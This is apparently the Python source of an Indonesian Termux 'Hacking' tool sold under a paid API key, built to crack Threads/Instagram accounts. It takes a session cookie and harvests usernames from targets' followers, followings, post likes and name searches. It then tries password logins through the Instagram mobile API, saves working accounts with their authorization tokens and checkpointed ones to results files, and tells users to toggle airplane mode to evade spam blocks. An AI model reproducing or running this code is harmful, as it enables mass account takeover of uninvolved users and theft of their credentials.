...
try:
    ...
    import requests, re, json, uuid, time, hashlib, datetime, urllib.request, os, random, base64
    ...
    try:
        ...
        __import__('os').system(f'xdg-open https://wa.me/6283847921480?text=THREADS%20%3A%20{quote(str(e))}')
        exit()
    except (Exception, KeyboardInterrupt) as e:
        from urllib.parse import quote
        __import__('os').system(f'xdg-open https://wa.me/6283847921480?text=THREADS%20%3A%20{quote(str(e))}')
...
Dump, Useragent, Password, Sukses, Checkpoint, Metode, Looping, Password, Salah = [], {
    "Name": "SAMSUNG"
}, {
    "Type": "Default"
}, [], [], {
...
[bold white]     |  |   |  | |  ||  |   \   --.\ '-'  |\ `-' |.-'  `) 
[bold white]     `--'   `--' `--'`--'    `----' `--`--' `---' `----'  
     [bold white]Version :[bold blue] 5.0[bold white] || Author :[bold green] Rozhak[bold white] || Type :[bold blue] Hacking"""))
        return ("Sukses")
    ...
    def Terminal_Size(self):
        ...
        if int(self.get_terminal_size) < 65:
            self.Clear()
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Anda Diwajibkan Untuk Mengecilkan Tampilan Termux Sapai Kotak Ini Terlihat Rapi!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Kecilkan Termux) [bold green]<[bold yellow]<[bold red]<"))
            exit()
        else:
            if 'TERMUX_VERSION' in str(os.environ) or 'rozhak' in str(os.environ) or 'LAPTOP-LMA1HAAJ' in str(os.environ):
                ...
                self.Clear()
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Jangan Menggunakan Terminal Selain Termux, Kamu Juga Diwajibkan Menggunakan Termux Versi Terbaru Agar Berfungsi Dengan Baik!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Deteksi Terminal) [bold green]<[bold yellow]<[bold red]<"))
                exit()
...
class Login:
    ...
    def Username_And_Password(self):
        try:
            Terminal().Banner()
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Silahkan Masukan Cookies Akun Instagram Pastikan Sudah Terdaftar Dalam Aplikasi Threads!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
            cookies = Console().input("[bold grey50]   ╰─> ")
            self.full_name, self.username, self.user_ids, self.pengikut = self.Validasi_Cookies(cookies)
            if 'sessionid=' in str(cookies):
                with open('Data/Cookie.json', 'w') as w:
                    w.write(json.dumps({
                        "Cookie": cookies,
                    }))
                w.close()
                Console(width = 65, style = "bold grey50").print(Panel(f"""[bold white]Name :[bold green] {self.full_name}
[bold white]Link :[bold yellow] https://www.threads.net/@{self.username}""", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
                time.sleep(2.5)
                Fitur()
            else:
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Anda Harus Memasukan Cookies Threads Bukan Yang Lain!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Cookies Salah) [bold green]<[bold yellow]<[bold red]<"))
                exit()
    ...
    def Validasi_Cookies(self, cookies):
        with requests.Session() as r:
            r.headers.pop('Accept-Encoding');r.headers.pop('Accept');r.headers.pop('Connection')
            r.headers.update({
            ...
            response = r.get('https://www.threads.net/', cookies = {
                'cookie': cookies,
            })

            self.user_ids = re.search('"username":".*?","id":"(\d+)"', str(response.text)).group(1)
            self.__hs = re.search('"haste_session":"(.*?)",', str(response.text)).group(1)
            self.lsd = re.search('\\["LSD",\\[\\],{"token":"(.*?)"}', str(response.text)).group(1)
            self.av = re.search('"actorID":"(\d+)",', str(response.text)).group(1)
            self.jazoest = re.search('&jazoest=(\d+)",', str(response.text)).group(1)
            self.fb_dtsg = re.search('\\["DTSGInitData",\\[\\],{"token":"(.*?)",', str(response.text)).group(1)
            self.__hsi = re.search('"hsi":"(\d+)",', str(response.text)).group(1)
            ...
            data = {
                ...
                'lsd': self.lsd,
                'variables': '{"userID":"' + str(self.user_ids) + '"}',
                '__hs': self.__hs,
                'doc_id': '23915869101390205',
                'av': self.av,
                '__ccg': 'UNKNOWN',
                '__hsi': self.__hsi,
                'jazoest': self.jazoest,
            }
            response2 = r.post('https://www.threads.net/api/graphql', data = data, cookies = {
                'cookie': cookies,
            })
            self.json_data = json.loads(response2.text)
            if '\'username\':' in str(self.json_data):
                self.username = self.json_data['data']['user']['username']
                self.pengikut = self.json_data['data']['user']['follower_count']
                self.full_name = self.json_data['data']['user']['full_name']
                return (self.full_name, self.username, self.user_ids, self.pengikut)
            else:
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Anda Memasukan Cookies Threads Yang Salah Atau Kadaluarsa!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Login Gagal) [bold green]<[bold yellow]<[bold red]<"))
                time.sleep(3.5)
                self.Username_And_Password()

    def Validate(self, username, password, user_agent, type_login):
        ...
        with requests.Session() as r:
            ...
            r.headers.update({
                'x-ig-family-device-id': '{}'.format(self.x_ig_family_device_id),
                'x-ig-android-id': 'android-{}'.format(self._hash.hexdigest()[:16]),
                ...
                'x-ig-device-id': '{}'.format(self.x_ig_device_id),
            })
            data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{str(self._hash.hexdigest()[:16])}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{str(self.x_ig_family_device_id)}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22should_trigger_override_login_2fa_action%22%3A0%2C%22username_text_input_id%22%3A%22xtet89%3A47%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22device_id%22%3A%22android-{str(self._hash.hexdigest()[:16])}%22%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A204478373700250%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_caa_perf_enabled%22%3A0%2C%22is_platform_login%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22family_device_id%22%3Anull%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22xtet89%3A48%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\
            ...
            if '"IG-Set-Authorization"' in str(response.text.replace('\\', '')):
                self.ds_user_id = re.search('"pk_id":"(\d+)"', str(response.text.replace('\\', ''))).group(1)
                self.ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
                if str(type_login) == "Login":
                    return (self.ds_user_id, self.ig_set_authorization)
                else:
                    Sukses.append(f'{username}|{password}|{self.ig_set_authorization}|{user_agent}')
                    return ("Akun Sukses", username, password, self.ds_user_id, self.ig_set_authorization, user_agent)
            elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
                if str(type_login) == "Login":
                    Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Sepertinya Akun Threads Anda Memerlukan Persetujuan Login!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Checkpoint) [bold green]<[bold yellow]<[bold red]<"))
                    time.sleep(4.5)
                    self.Username_And_Password()
                else:
                    Checkpoint.append(f'{username}|{password}|{user_agent}')
                    return ("Akun Checkpoint", username, password, user_agent)
            elif 'Kata Sandi Salah' in str(response.text.replace('\\', '')):
                if str(type_login) == "Login":
                    Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Username Atau Password Yang Anda Masukan Tidak Valid!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Kata Sandi Salah) [bold green]<[bold yellow]<[bold red]<"))
                    time.sleep(4.5)
                    self.Username_And_Password()
                else:
                    return ("Password Salah", username, password)
                ...
                if str(type_login) == "Login":
                    Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Silahkan Hidupkan Mode Pesawat Sebelum Anda Login!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Terkena Spam) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    return ("Terkena Spam", username, password)
            else:
                if str(type_login) == "Login":
                    Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Terjadi Kesalahan Saat Login Silahkan Coba Untuk Menghidupkan Mode Pesawat Sebelum Login Jika Masih Tidak Bida Ganti Akun!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    return ("Login Error", username, password)

class Checkpoints:

    def __init__(self):
        global Checkpoint, Looping, Sukses
        Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Silahkan Masukan File Checkpoint Ketik ([italic red]dir Results[italic white]) Untuk Mengetahui Nama File Dan Pastikan Terdapat Hasil Dalam File Tersebut, Misalnya :[italic green] Results/Cp-{Convert().Tanggal_Sekarang()}.txt", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
        files = Console().input("[bold grey50]   ╰─> ")
        if 'Results/' in str(files):
            self.read_files = (open(files, 'r').read().splitlines())
        else:
            self.read_files = (open(f'Results/{files}', 'r').read().splitlines())
        Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Sedang Melakukan Cracking Kamu Wajib Menghidupkan[italic red] Mode Pesawat[italic white] Jika Ada Perintah Atau Jika Muncul[italic red] Tulisan Error[italic white] Dan Anda Bisa Menggunakan[italic green] CTRL + C[italic white] Jika Crack Stuck!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
        for z in self.read_files:
            try:
                self.username, self.password = z.split('|')[0], z.split('|')[1]
                self.status_login = Login().Validate(self.username, self.password, 'Barcelona 289.0.0.77.109 Android (28/9; 320dpi; 720x1412; Realme; RMX1941; RMX1941; mt6765; in_ID; 489720145)', type_login = "Crack Ulang Checkpoint")
                if 'Akun Sukses' in str(self.status_login):
                    self.status, self.username, self.password, self.ds_user_ids, self.ig_set_authorization, self.useragent = (self.status_login)
                    Console().print(f"                                                               ", end='\r')
                    time.sleep(1.5)
                    tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style = "bold grey50"), style="bold white")
                    tree.add(Columns([Panel(f"[bold green]{self.username}", style = "bold grey50", width=30), Panel(f"[bold green]{self.password}", style = "bold grey50", width=30)]))
                    tree.add(Panel(f"[bold green]{self.useragent}", style = "bold grey50", width=61))
                    tree.add(Panel(f"[bold green]{self.ig_set_authorization}", style = "bold grey50", width=61))
                    print(tree)
                    time.sleep(2.5)
                    Looping += 1
                    with open(f'Results/Ok-{Convert().Tanggal_Sekarang()}.txt', 'a+') as w:
                        w.write(f'{self.username}|{self.password}|{self.ig_set_authorization}|{self.useragent}\n')
                    w.close()
                    continue
                elif 'Akun Checkpoint' in str(self.status_login):
                    self.status, self.username, self.password, self.useragent = (self.status_login)
                    Console().print(f"                                                               ", end='\r')
                    time.sleep(1.5)
                    tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold grey50"), style="bold white")
                    tree.add(Columns([Panel(f"[bold red]{self.username}", style = "bold grey50", width=30), Panel(f"[bold red]{self.password}", style = "bold grey50", width=30)]))
                    tree.add(Panel(f"[bold red]{self.useragent}", style = "bold grey50", width=61))
                    print(tree)
                    time.sleep(2.5)
                    Looping += 1
                    with open(f'Results/Cp-{Convert().Tanggal_Sekarang()}.txt', 'a+') as w:
                        w.write(f'{self.username}|{self.password}|{self.useragent}\n')
                    w.close()
                    continue
                elif "Terkena Spam" in str(self.status_login):
                    Console().print(f"[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 2 DETIK!     ", end='\r')
                    time.sleep(5.0)
                else:
                    pass
                Looping += 1
                Console().print(f"[bold grey50]   ──>[bold white] Crack[bold green] @{self.username}[bold white]/[bold blue]{str(len(self.read_files))}[bold white]/[bold blue]{Looping}[bold white] Ok:-[bold green]{len(Sukses)}[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white]     ", end='\r')
                time.sleep(0.007)
                ...
                time.sleep(5.0)
                continue
        Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Selamat Kamu Telah Mendapatkan {len(Sukses)} Hasil Sukses Dan {len(Checkpoint)} Hasil Checkpoint Dari {str(len(self.read_files))} Username!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Selesai) [bold green]<[bold yellow]<[bold red]<"))
        exit()
...
class Convert:
    ...
    def Akun_Publik(self, cookies, username):
        with requests.Session() as r:
            ...
            response = r.get('https://www.threads.net/@{}'.format(username), cookies = {
                'cookie': cookies,
            })

            self.user_ids = re.search('"userID":"(\d+)"', str(response.text)).group(1)
            self.__hs = re.search('"haste_session":"(.*?)",', str(response.text)).group(1)
            self.lsd = re.search('\\["LSD",\\[\\],{"token":"(.*?)"}', str(response.text)).group(1)
            self.av = re.search('"actorID":"(\d+)",', str(response.text)).group(1)
            self.jazoest = re.search('&jazoest=(\d+)",', str(response.text)).group(1)
            ...
            r.headers.update({
                ...
                'x-ig-app-id': '238260118697367',
                'accept': '*/*',
                'x-fb-friendly-name': 'BarcelonaFriendshipsDialogUserQuery',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'referer': 'https://www.threads.net/',
                'sec-fetch-mode': 'cors',
                'content-type': 'application/x-www-form-urlencoded',
            ...
            data = {
                ...
                'fb_dtsg': self.fb_dtsg,
                'server_timestamps': 'true',
                'fb_api_req_friendly_name': 'BarcelonaFriendshipsDialogUserQuery',
                'lsd': self.lsd,
                'variables': '{"userID":"' + str(self.user_ids) + '"}',
                '__hs': self.__hs,
            ...
            self.json_data = json.loads(response2.text)
            if '\'counts\':' in str(self.json_data):
                self.total_followers_count = self.json_data['data']['counts']['total_followers_count']
                self.total_following_count = self.json_data['data']['counts']['total_following_count']
                return (self.total_followers_count, self.total_following_count, 'null')
            else:
...
def Buy_Apikey():
    Terminal().Banner()
    Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Apikey Kamu Sudah[italic red] Kadaluarsa[italic white] Agar Bisa Masuk Anda Harus Upgrade Ke[italic green] Premium[italic white], Pilih Harga[italic green] Perminggu[italic white] Atau[italic green] Perbulan[italic white] Dari List Di Bawah Ini Atau Melakukan Pembayaran Di ([italic green]https://wa.me/6283847921480[italic white])", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Upgrade Apikey) [bold green]<[bold yellow]<[bold red]<"))
    Console(style = "bold grey50").print(Columns([
...
class Think_Threads:
    ...
    def Apikey(self):
        try:
            Terminal().Banner()
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Silahkan Masukan Apikey Threads Pastikan Hanya Menggunakan Satu Device Dan Ketik[italic green] GET[italic white] Untuk Mendapatkan Apikey!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
            apikey = Console().input("[bold grey50]   ╰─> ")
            if str(apikey).upper() == 'GET':
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Mendaftar Di ([italic green]https://instakey.rozhak.xyz/register/[italic white]) Lalu Isi Username, Email, Password Dan Konfirmasi Kode Dari Email. ([italic green]https://instakey.rozhak.xyz/getkey/[italic white]) Lalu Copy Apikey Kamu.", title = "[bold red]>[bold yellow]>[bold green]> [bold grey50](Dapatkan Apikey)[bold green] <[bold yellow]<[bold red]<"));time.sleep(1.5)
                Console().input("[bold white][[bold green]Buy Apikey[bold white]]")
                os.system('xdg-open https://wa.me/6283847921480')
                exit()
            else:
                ...
                w.close()
                Console(width = 65, style = "bold grey50").print(Panel(f"""[bold white]Your Email :[bold green] {self.email}
[bold white]Expired :[bold yellow] {self.expired}""", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
                time.sleep(2.5)
                Fitur()
        except (Exception) as e:
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]{str(e).title()}!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"))
    ...
    def Validasi(self, apikey, platform):
        with requests.Session() as r:
            ...
            if 'maaf key yang anda masukan tidak terdaftar diserver kami' in str(response):
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Apikey Yang Anda Masukan Tidak Terdaftar Diserver Kami!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"))
                os.system('xdg-open https://wa.me/6283847921480')
                time.sleep(4.6)
                self.Apikey()
            else:
                if response['readtext'].lower() == 'sudah kadaluarsa':
                    Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Apikey Sudah Kadaluarsa Silahkan Upgrade Ke Premium!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"))
                    os.system('xdg-open https://wa.me/6283847921480')
                    time.sleep(3.5)
                    self.Apikey()
                else:
                    if response['status_device'] == 'pemakaian device sudah habis, jika anda menggantikan device lagi maka akan ketolak server':
                        Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Pemakaian Device Habis, Hubungi Author Untuk Reset Device!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"))
                        time.sleep(3.5)
                        self.Apikey()
                        ...
                        if response['status'] == 'berlaku':
                            ...
                            Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Terjadi Kesalahan Yang Tidak Diketahui Oleh Server!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"))
                            time.sleep(3.5)
                            self.Apikey()
...
class Fitur:
    ...
    def __init__(self):
        try:
            ...
            self.status, self.email, self.joined, self.expired = Think_Threads().Validasi(self.apikey, platform())
        except (Exception) as e:
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic blue]{str(e).title()}!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(4.5)
            Think_Threads().Apikey()
        try:
            self.cookies = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
            self.full_name, self.username, self.user_ids, self.pengikut = Login().Validasi_Cookies(self.cookies)
        except (Exception) as e:
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]{str(e).title()}!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(4.5)
        ...
        Console(style = "bold grey50").print(Columns([
            Panel(f"""[bold white]Username :[bold green] @{str(self.username)[:16]}
[bold white]Follower :[bold red] {str(self.pengikut)[:16]}""", width=32),
            Panel(f"""[bold white]Expired :[bold red] {str(self.expired)[:18]}
[bold white]Status :[bold green] {str(self.status)[:19].capitalize()}""", width=32),
]))

        self.jumlah, self.online = Pengguna()

        Console(width = 65, style = "bold grey50").print(Panel("""[bold green]01[bold white]. Crack User Dari Mengikuti    [bold green]05[bold white]. Lihat Semua Hasil Crack
[bold green]02[bold white]. Crack Results Checkpoint     [bold green]06[bold white]. Crack User Dari Likes
[bold green]03[bold white]. Crack User Dari Nama         [bold green]07[bold white]. Keluar ([bold red]Exit[bold white])
[bold green]04[bold white]. Crack User Dari Pengikut""", title=f"[bold red]>[bold yellow]>[bold green]>[bold grey50] (Pengguna {self.jumlah}/{self.online} Online) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
        query = Console().input("[bold grey50]   ╰─> ")
        if query == '01' or query == '1':
            try:
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Silahkan Masukan Username Akun Threads Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] rozhak_official,rozhak.sch.id[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
                username = Console().input("[bold grey50]   ╰─> ").replace('@', '')
                for self.username in username.split(','):
                    Dumping().Exsekusi_Mengikuti(self.cookies, self.username)
                if len(Dump) < 50:
                    ...
                    Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Jumlah Username Yang Terkumpul :[italic green] {len(Dump)}", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<"))
                    Pengaturan()
            except (Exception) as e:
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]{str(e).title()}!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            ...
            try:
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Silahkan Masukan Nama Target Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] Rozhak,Mark Zuckerberg[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
                name = Console().input("[bold grey50]   ╰─> ")
                for self.name in name.split(','):
                    Dumping().Exsekusi_Pencarian(self.cookies, self.name)
                if len(Dump) < 9:
                    Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 10 Username!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Jumlah Username Yang Terkumpul :[italic green] {len(Dump)}", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<"))
                    Pengaturan()
            ...
            try:
                ...
                username = Console().input("[bold grey50]   ╰─> ").replace('@', '')
                for self.username in username.split(','):
                    Dumping().Exsekusi_Pengikut(self.cookies, self.username)
                if len(Dump) < 50:
                    Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
            ...
            try:
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Silahkan Masukan Link Postingan Target Pastikan Akun Tidak Terkunci Dan Memiliki Likes Anda Juga Bisa Menggunakan Koma Untuk Dump Masal *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
                link_postingan = Console().input("[bold grey50]   ╰─> ").replace('@', '')
                for self.link_postingan in link_postingan.split(','):
                    if '/post/' in str(self.link_postingan):
                        Dumping().Exsekusi_Likes(self.cookies, self.link_postingan)
                    else:
                        continue
                if len(Dump) < 50:
                    Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
            ...
            try:
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Sedang Mencoba Untuk Menghapus Akses Token Threads Anda!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Hapus Token) [bold green]<[bold yellow]<[bold red]<"))
                time.sleep(3.5)
            ...
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Fitur!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Pilihan Tidak Diketahui) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(2.5)
            Fitur()
...
class Dumping:
    ...
    def Exsekusi_Mengikuti(self, cookies, username):
        try:
            with requests.Session() as r:
                r.headers.pop('Accept-Encoding');r.headers.pop('Accept');r.headers.pop('Connection')
                r.headers.update({
                ...
                self.Next_Mengikuti(cookies, self.user_ids, self.__hs, self.lsd, self.av, self.jazoest, self.fb_dtsg, self.__hsi, after = 0)
        except (Exception) as e:
            Console().print(f"[bold grey50]   ╰─>[bold red] {str(e).upper()}!", end='\r')
            time.sleep(5.0)
            return ("Dump Error")

    def Next_Mengikuti(self, cookies, user_ids, __hs, lsd, av, jazoest, fb_dtsg, __hsi, after):
        try:
            with requests.Session() as r:
                r.headers.pop('Accept-Encoding');r.headers.pop('Accept');r.headers.pop('Connection')
                r.headers.update({
                ...
                'x-ig-app-id': '238260118697367',
                'accept': '*/*',
                'x-fb-friendly-name': 'BarcelonaFriendshipsFollowingTabRefetchableQuery',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'x-fb-lsd': lsd,
                'accept-encoding': 'gzip, deflate',
                'Host': 'www.threads.net',
            ...
            data = {
                ...
                'lsd': lsd,
                'variables': '{"after":"' + str(after) + '","before":null,"count":20,"first":10,"last":null,"userID":"' + str(user_ids) + '","__relay_internal__pv__BarcelonaIsLoggedInrelayprovider":true}',
                '__hs': __hs,
            ...
            self.json_data = json.loads(response2.text)
            if '\'full_name\': \'' in str(self.json_data) or '\'username\': \'' in str(self.json_data):
                self.finds_all_username = re.findall("'pk': '\d+', 'full_name': '(.*?)'.*?'username': '(.*?)',", str(self.json_data))
                for z in self.finds_all_username:
                    try:
                        self.full_name, self.username = z[0], z[1]
                        if str(self.username) in str(Dump):
                            continue
                        else:
                            Dump.append(f'{self.username}|{self.full_name}')
                            Console().print(f"[bold grey50]   ╰─>[bold green] Dump @{str(self.username)[:20]}/{len(Dump)} Username...     ", end='\r')
                            time.sleep(0.0007)
                    except (IndexError):
                        continue
                if '\'page_info\': {\'end_cursor\':' in str(self.json_data) and '\'has_next_page\': True,' in str(self.json_data):
                    self.end_cursor = re.search("'end_cursor': '(.*?)',", str(self.json_data)).group(1)
                    self.Next_Mengikuti(cookies, user_ids, __hs, lsd, av, jazoest, fb_dtsg, __hsi, self.end_cursor)
                else:
                    return ("Dump Sukses")
            else:
                Console().print(f"[bold grey50]   ╰─>[bold red] Tidak Ada Pengguna Yang Ditemukan!", end='\r')
                time.sleep(4.0)
                return ("Dump Error")
        except (RequestException):
            Console().print(f"[bold grey50]   ╰─>[bold red] Koneksi Error...                            ", end='\r')
            time.sleep(7.5)
            self.Next_Mengikuti(cookies, user_ids, __hs, lsd, av, jazoest, fb_dtsg, __hsi, after)
        except (KeyboardInterrupt):
            Console().print(f"                                                               ", end='\r')
            time.sleep(1.5)
            return ("Dump Sukses")

    def Exsekusi_Pencarian(self, cookies, name):
        try:
            with requests.Session() as r:
                r.headers.pop('Accept-Encoding');r.headers.pop('Accept');r.headers.pop('Connection')
                r.headers.update({
                ...
                response = r.get('https://www.threads.net/search', cookies = {
                    'cookie': cookies,
                })
                ...
                self.Next_Pencarian(cookies, name, self.__hs, self.lsd, self.av, self.jazoest, self.fb_dtsg, self.__hsi)
        except (Exception) as e:
            Console().print(f"[bold grey50]   ╰─>[bold red] {str(e).upper()}!", end='\r')
            time.sleep(5.0)
            return ("Dump Error")

    def Next_Pencarian(self, cookies, name, __hs, lsd, av, jazoest, fb_dtsg, __hsi):
        try:
            with requests.Session() as r:
                r.headers.pop('Accept-Encoding');r.headers.pop('Accept');r.headers.pop('Connection')
                r.headers.update({
            ...
            data = {
                ...
                'lsd': lsd,
                'variables': '{"query":"' + str(name) + '","first":10,"__relay_internal__pv__BarcelonaIsLoggedInrelayprovider":true}',
                '__hs': __hs,
            ...
            Console().print(f"[bold grey50]   ╰─>[bold red] Koneksi Error...                            ", end='\r')
            time.sleep(7.5)
            self.Next_Pencarian(cookies, name, __hs, lsd, av, jazoest, fb_dtsg, __hsi)
        except (KeyboardInterrupt):
            Console().print(f"                                                               ", end='\r')
            time.sleep(1.5)
            return ("Dump Sukses")

    def Exsekusi_Pengikut(self, cookies, username):
        try:
            with requests.Session() as r:
                r.headers.pop('Accept-Encoding');r.headers.pop('Accept');r.headers.pop('Connection')
                r.headers.update({
                ...
                self.Next_Pengikut(cookies, self.user_ids, self.__hs, self.lsd, self.av, self.jazoest, self.fb_dtsg, self.__hsi, after = '')
        except (Exception) as e:
            Console().print(f"[bold grey50]   ╰─>[bold red] {str(e).upper()}!", end='\r')
            time.sleep(5.0)
            return ("Dump Error")

